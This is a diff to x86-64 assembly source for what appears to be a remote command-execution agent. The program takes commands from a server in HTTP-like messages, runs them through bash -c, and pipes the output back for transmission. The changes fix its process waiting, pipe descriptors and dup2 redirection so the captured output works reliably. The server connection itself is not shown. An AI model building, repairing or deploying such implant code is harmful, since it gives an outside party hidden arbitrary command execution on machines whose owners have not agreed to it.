@@ -17,13 +17,14 @@ section .data
     bash_cmd_str db "-c", 0x0               ; Bash command string option
     cmd_buffer_length dq 0x0                ; Length of the cmd_buffer
     tx_buffer_length dq 0x0                 ; Length of the tx_buffer
+    status_data dq 0x0                      ; Status of wait4 syscall
 
 section .bss
     rx_buffer resb 0x400                    ; Receiving buffer from the server, 1KB max
     tx_buffer resb 0x400                    ; Transmitting buffer to the server, 1KB max
     cmd_buffer resb 0x100                   ; Buffer for received command
     argv resq 0x4                           ; Argument values for execve call
-    pipe_fd resq 0x2                        ; pipe file descriptors for IPC
+    pipe_fd resd 0x2                        ; pipe file descriptors for IPC
 
 section .text
     global _start
@@ -208,27 +209,27 @@ fn_exec_cmd:
     
 .parent_process_branch:
 
+    mov r9, rax                 ; Save PID
+
     ; Close write pipe
     mov rax, 0x3                ; close syscall
-    mov rdi, [pipe_fd+8]
+    mov edi, dword [pipe_fd+4]
     syscall
 
     ; Wait for the child process to terminate
-    ;mov rax, 0x3d                ; wait4 syscall
-    ;xor rdi, rdi                 ; pid = -1 (wait for any child process)
-    ;lea rsi, [child_status]      ; Pointer to store status
-    ;xor rdx, rdx                 ; options = 0 (default behavior)
-    ;xor r10, r10                 ; rusage = NULL (no resource usage info)
-    ;syscall
+    mov rax, 0x3d               ; wait4 syscall
+    mov rdi, r9                 ; pid of child
+    lea rsi, [status_data]      ; Pointer to store status
+    xor rdx, rdx                ; options = 0 (default behavior)
+    xor r10, r10                ; rusage = NULL (no resource usage info)
+    syscall
 
-    ;cmp rax, 0
-    ;jl fn_error_exit             ; Exit if wait4 fails
-
-    call fn_sleep_ns
+    cmp rax, 0
+    jl fn_error_exit            ; Exit if wait4 fails
 
     ; Use ioctl to get number of bytes available
     mov rax, 0x10               ; ioctl syscall
-    mov rdi, qword [pipe_fd]    ; pipe_fd[0]
+    mov edi, dword [pipe_fd]    ; pipe_fd[0]
     mov rsi, 0x541B             ; FIONREAD command
     lea rdx, [rsp+8]            ; Pointer to result buffer
     syscall
@@ -237,7 +238,7 @@ fn_exec_cmd:
 
     ; Read that much bytes
     xor rax, rax                ; read syscall
-    mov rdi, qword [pipe_fd]    ; pipe_fd[0]
+    mov edi, dword [pipe_fd]    ; pipe_fd[0]
     lea rsi, [tx_buffer]        ; Load address of transmit buffer
     ; byte count already in rdx
     syscall
@@ -248,14 +249,19 @@ fn_exec_cmd:
 
     ; Close read pipe
     mov rax, 0x3                ; close syscall
-    mov rdi, [pipe_fd]
+    mov edi, dword [pipe_fd]
     syscall
 
     ; Use dup2 to redirect STDOUT to pipe
     ; After this call, execve output will be redirected to pipe
-    mov rax, 0x3f               ; dup2 syscall
-    mov rdi, 0x1                ; oldfd = 1 (STDOUT)
-    mov rsi, [pipe_fd+8]        ; newfd = pipe_fd[1]
+    mov rax, 0x21               ; dup2 syscall
+    mov rdi, [pipe_fd+4]        ; oldfd = pipe_fd[1]
+    mov rsi, 0x1                ; newfd = 1 (STDOUT)
+    syscall
+
+    ; Close write pipe
+    mov rax, 0x3                ; close syscall
+    mov rdi, [pipe_fd+4]
     syscall
 
     ; argv loading
@@ -288,6 +294,7 @@ fn_parse_command:
     mov rbp, rsp
     sub rsp, 0x8                ; Stackframe
 
+    call fn_sleep_ns
     ; Trick is to find \r\n\r\n in http command
     ; Iterate through the whole buffer to find that pattern
     xor rax, rax                ; The pattern finder
